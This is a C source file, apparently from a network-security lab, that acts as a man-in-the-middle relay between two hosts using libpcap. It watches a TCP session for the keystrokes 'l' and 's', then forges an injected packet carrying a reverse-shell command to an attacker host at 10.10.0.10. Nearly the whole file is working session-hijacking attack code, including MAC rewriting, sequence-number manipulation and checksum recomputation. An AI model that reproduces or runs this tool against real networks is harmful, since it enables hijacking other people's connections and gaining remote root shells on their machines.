// SPDX-License-Identifier: Unlicense

#include <linux/tcp.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <stdlib.h>
#include <string.h>

#include "log.h"
#include "tcp_util.h"
#include "util.h"

#define HOST_A_MAC "0a:1a:5d:92:0a:20"
#define HOST_B_MAC "7e:8f:c5:5e:f3:09"

static int
is_triggered(struct iphdr *iphdr, struct tcphdr *tcphdr)
{
  static int found_l = 0;
  char *data;
  uint32_t tcp_hdr_len = tcphdr->doff * 4;
  uint32_t data_len =
      ntohs(iphdr->tot_len) - sizeof(struct iphdr) - tcp_hdr_len;

  if(data_len > 1) {
    // no found, return 0
    return 0;
  }

  data = (char *)tcphdr + tcp_hdr_len;
  if(*data == 'l') {
    found_l = 1;
  } else if(*data == 's' && found_l) {
    return 1;
  } else {
    found_l = 0;
    return 0;
  }

  return 0;
}

static u_char *
hijack_tcp_connection(const u_char *pkt, struct iphdr *iphdr,
                      struct tcphdr *tcphdr, const char *cmd, size_t *len)
{
  uint32_t tcp_hdr_len = tcphdr->doff * 4;
  uint32_t retpkt_len =
      sizeof(struct ether_header) + sizeof *iphdr + tcp_hdr_len;
  uint32_t seqnum = ntohl(tcphdr->seq);
  char *data      = 0;

  // adjust the size of the packet
  retpkt_len += 2 + strlen(cmd) + 3;

  // adjut the packet itself using realloc
  pkt = realloc((void *)pkt, retpkt_len);
  if(!pkt) {
    print_err("realloc failure: Check if that works!\n");
    exit(EXIT_FAILURE);
  }

  print_log("Sending hijacked packet!\n");
  // readjust the pointer references
  iphdr  = (struct iphdr *)(pkt + sizeof(struct ether_header));
  tcphdr = (struct tcphdr *)(pkt + sizeof(struct ether_header) + sizeof *iphdr);

  // move the sequence number forward
  tcphdr->seq = htonl(seqnum + 10);

  data    = (char *)tcphdr + tcp_hdr_len;
  data[0] = '\n';
  data[1] = '\n';
  memcpy(data + 2, cmd, strlen(cmd));
  data[2 + strlen(cmd)] = '\n';
  data[3 + strlen(cmd)] = '\n';

  // adjust the total length
  iphdr->tot_len = htons(sizeof(struct iphdr) + tcp_hdr_len + 5 + strlen(cmd));

  // compute checksum
  iphdr->check  = 0;
  iphdr->check  = chksum((uint16_t *)iphdr, sizeof(struct iphdr));
  tcphdr->check = compute_tcp_checksum(tcphdr, iphdr);

  *len = retpkt_len;
  return (u_char *)pkt;
}

void
parse_tcp(const u_char *pkt, const char *my_mac_addr, pcap_t *handle,
          unsigned len)
{
  struct iphdr *ip;
  struct tcphdr *tcp;
  struct ether_header *eth;
  struct ether_addr *eth_addr;
  static struct in_addr host_a_addr;
  static struct in_addr host_b_addr;

  eth = (struct ether_header *)pkt;
  ip  = (struct iphdr *)(pkt + sizeof *eth);
  tcp = (struct tcphdr *)(pkt + sizeof *eth + sizeof *ip);

  size_t pktlen = len; // track the packet's length because we might change it.

  inet_aton("10.10.0.4", &host_a_addr);
  inet_aton("10.10.0.5", &host_b_addr);

  // fix the ethernet header
  eth_addr = ether_aton(my_mac_addr);
  memcpy(eth->ether_shost, eth_addr->ether_addr_octet, sizeof eth->ether_shost);
  if(ip->saddr == host_a_addr.s_addr) {
    // packet coming from host a to host b.
    // in this case, ethernet should be from attacker to host b.
    eth_addr = ether_aton(HOST_B_MAC);
    memcpy(eth->ether_dhost, eth_addr->ether_addr_octet,
           sizeof eth->ether_dhost);
  } else if(ip->saddr == host_b_addr.s_addr) {
    // packet coming from host a to host b.
    // in this case, ethernet should be from attacker to host b.
    eth_addr = ether_aton(my_mac_addr);
    memcpy(eth->ether_shost, eth_addr->ether_addr_octet,
           sizeof eth->ether_shost);

    eth_addr = ether_aton(HOST_A_MAC);
    memcpy(eth->ether_dhost, eth_addr->ether_addr_octet,
           sizeof eth->ether_dhost);
  }

  if(is_triggered(ip, tcp)) {

    pkt = hijack_tcp_connection(
        pkt, ip, tcp, "sudo bash -i &> /dev/tcp/10.10.0.10/1234 0<&1", &pktlen);
  } else {
    // print_log("Forwarding packet as is\n");
    tcp->check = 0;
    tcp->check = compute_tcp_checksum(tcp, ip);
    ip->check  = 0;
    ip->check  = chksum((uint16_t *)ip, sizeof *ip);
  }

  int rc = pcap_inject(handle, pkt, pktlen);
  if(rc == PCAP_ERROR_NOT_ACTIVATED) {
    print_err("Pcap was not actived!\n");
    exit(EXIT_FAILURE);
  } else if(rc == PCAP_ERROR) {
    print_err("Pcap error: %s\n", pcap_geterr(handle));
    exit(EXIT_FAILURE);
  }
}

uint16_t
compute_tcp_checksum(struct tcphdr *tcp, struct iphdr *ip)
{
  unsigned long cksum = 0;
  uint16_t tcplen     = ntohs(ip->tot_len) - (ip->ihl * 4);
  struct pseudo_tcp_hdr pseudohdr;
  uint16_t *hdr;
  uint32_t len;

  // make sure this is zero.
  tcp->check = 0;

  // fill up the pseudo header
  pseudohdr.saddr   = ip->saddr;
  pseudohdr.daddr   = ip->daddr;
  pseudohdr.zero    = 0;
  pseudohdr.ptcl    = ip->protocol;
  pseudohdr.tcp_len = htons(tcplen);

  // start over the pseudoheader
  len = sizeof pseudohdr;
  hdr = (uint16_t *)(&pseudohdr);
  while(len > 1) {
    cksum += *hdr++;
    len -= sizeof(uint16_t);
  }

  // pseudo header is always 96 bits or 24 bytes, which means len is 0 now.
  len = tcplen;
  hdr = (uint16_t *)tcp;
  while(len > 1) {
    cksum += *hdr++;
    len -= sizeof(uint16_t);
  }

  if(len)
    cksum += *(u_char *)hdr;

  cksum = (cksum >> 16) + (cksum & 0xffff);
  cksum += (cksum >> 16);

  return (uint16_t)~cksum;
}
